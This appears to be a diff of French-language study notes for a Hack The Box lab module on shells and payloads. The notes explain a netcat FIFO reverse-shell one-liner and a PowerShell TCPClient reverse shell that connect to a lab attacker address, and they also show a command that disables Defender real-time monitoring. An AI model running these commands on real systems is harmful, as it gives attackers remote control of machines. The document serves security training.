@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T20:26:12.849Z
+date: 2025-05-17T20:31:09.418Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -169,7 +169,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 La **payload** est le contenu principal d’un message. En informatique, c’est l’information utile transmise. En **cybersécurité**, elle désigne un code ou une commande exploitant une faille, souvent à des fins malveillantes.
 
-
 ## One-Liners Examined
 
 ### Netcat/Bash Reverse Shell One-liner
@@ -188,11 +187,11 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 777
    Concatène le fichier nommé **/tmp/f** (un FIFO), et transmet sa sortie via un pipe à la commande suivante.
 
 1. **`/bin/bash -i 2>&1 |`**
-		Spécifie l'interpréteur de commandes (avec -i pour le rendre interactif). L'expression 2>&1 redirige le flux d'erreur standard (2) et le flux de sortie standard (1) vers la commande qui suit le symbole | (pipe).
+   Spécifie l'interpréteur de commandes (avec -i pour le rendre interactif). L'expression 2>&1 redirige le flux d'erreur standard (2) et le flux de sortie standard (1) vers la commande qui suit le symbole | (pipe).
 
-5. **`nc 10.10.14.12 7777 > /tmp/f`**
-		Utilise Netcat pour envoyer une connexion vers l'attaquant. La sortie sera redigigée vers le pipe nommé (FIFO) **/tmp/f**.
-    
+1. **`nc 10.10.14.12 7777 > /tmp/f`**
+   Utilise Netcat pour envoyer une connexion vers l'attaquant. La sortie sera redigigée vers le pipe nommé (FIFO) **/tmp/f**.
+
 ### PowerShell One-liner Explained
 
 ```
@@ -201,12 +200,11 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 1. **`powershell -nop -c `**
    La commande exécute PowerShell sans charger de profil (`-nop`) et exécute une commande ou un bloc de script spécifié entre guillemets grâce à l'option `-c`. Cette commande PowerShell est utilisée depuis `cmd.exe`, utile en cas de faille RCE permettant d'exécuter des commandes via cmd.exe sans se trouver à la base dans le shell PowerShell.
-   
 1. **`"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`**
    Cette commande instancie l'objet .NET `System.Net.Sockets.TCPClient` et l’assigne à la variable `$client`. L'instance va ensuite se connecter avec le socket (adresse + port) précisé lors de l'instanciation de l'objet via son constructeur. **C'est l'opération de binding**.
 
 1. **`$stream = $client.GetStream();`**
-    Défini la variable `$stream` en appelant la méthode [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) sur l’objet $client pour gérer la communication réseau. **C'est l'opération de déinition du flux de commande**
+   Défini la variable `$stream` en appelant la méthode [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) sur l’objet $client pour gérer la communication réseau. **C'est l'opération de déinition du flux de commande**
 
 1. **`[byte[]]$bytes = 0..65535|%{0};`**
    Cette commande crée un tableau de type byte nommé $bytes contenant 65 535 zéros. C’est un flux de bytes vide destiné à être envoyé vers le listener.
@@ -215,7 +213,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
    lance une boucle while où la variable `$i` est initialisée avec le résultat de la méthode `Read` du flux ([`$stream.Read`](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)). Cette méthode lit des données dans le buffer `$bytes`, à partir de l’offset 0, pour une longueur égale à la taille de `$bytes`.
 
 1. **`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`**
-    Définit la variable `$data` en lui assignant une instance de classe du framework .NET pour l’encodage ASCII, qui sera utilisée avec la méthode GetString pour convertir le flux de bytes ($bytes) en texte ASCII. En résumé, ce que nous tapons sera encodé en texte ASCII.
+   Définit la variable `$data` en lui assignant une instance de classe du framework .NET pour l’encodage ASCII, qui sera utilisée avec la méthode GetString pour convertir le flux de bytes ($bytes) en texte ASCII. En résumé, ce que nous tapons sera encodé en texte ASCII.
 
 1. **`$sendback = (iex $data 2>&1 | Out-String );`**
    Définit/évalue la variable `$sendback` en lui assignant le résultat de la commande `Invoke-Expression` avec la variable `$data`, puis redirige la sortie d’erreur standard et la sortie standard via un pipe vers la commande `Out-String` qui convertit les objets en chaînes de caractères.
@@ -224,9 +222,11 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
    Définit la variable `$sendback2` en lui assignant la variable `$sendback` concaténé avec la chaîne de caractères `PS` et le chemin du répertoire de travail courant et le caractère `>`.
 
 1. **`$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   Définit/évalue la variable $sendbyte en lui assignant le flux d’octets encodé en ASCII.
 
 1. **`$client.Close()"`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   Utilise la méthode [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) pour terminer la connexion.
 
 Il est possible d'avoir le même résultat en passant par un script PowerShell et non un one-liner. Par exemple avec la cmdlet [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) du projet Nishang.
+
+# Automating Payloads & Delivery with Metasploit
